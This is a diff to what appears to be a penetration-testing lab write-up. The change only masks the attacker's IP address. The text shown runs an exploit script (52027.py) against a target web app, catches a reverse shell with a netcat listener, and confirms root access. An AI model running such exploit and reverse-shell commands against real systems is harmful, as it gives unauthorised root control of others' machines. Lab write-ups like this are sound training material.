@@ -99,14 +99,14 @@ After successfully downloading the python libraries we can run the script with t
 
 		usage: 52027.py [-h] --url URL [--port PORT] --ip IP 
 
-		python3 52027.py --url http://192.168.136.97:5000/ --port 80 --ip 192.168.45.181
+		python3 52027.py --url http://192.168.136.97:5000/ --port 80 --ip 192.168.xxx.xx
 
 
 The above command inputs the URL of our accessed webpage and identifies a port/IP address combination to point a reverse shell with root access back on out machine:
 
 └$ nc -lvnp 80                       
 listening on [any] 80 ...
-connect to [192.168.45.181] from (UNKNOWN) [192.168.136.97] 37430
+connect to [192.168.xxx.xx] from (UNKNOWN) [192.168.136.97] 37430
 root@detection:/# whoami
 whoami
 root
